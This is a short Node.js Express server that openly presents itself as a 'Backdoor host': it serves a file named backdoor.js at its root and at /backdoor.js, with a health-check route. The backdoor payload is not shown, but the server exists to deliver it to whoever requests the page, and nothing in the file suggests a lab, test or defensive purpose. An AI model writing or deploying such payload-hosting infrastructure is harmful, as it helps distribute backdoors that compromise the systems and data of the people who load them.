const express = require('express');
const path = require('path');
const app = express();
const PORT = process.env.PORT || 3000;

// Serve backdoor.js
app.get('/backdoor.js', (req, res) => {
    res.sendFile(path.join(__dirname, 'backdoor.js'));
});

// Root serves backdoor.js
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'backdoor.js'));
});

// Health check
app.get('/health', (req, res) => {
    res.status(200).send('OK');
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Backdoor host running on port ${PORT}`);
    console.log(`📄 /backdoor.js`);
});
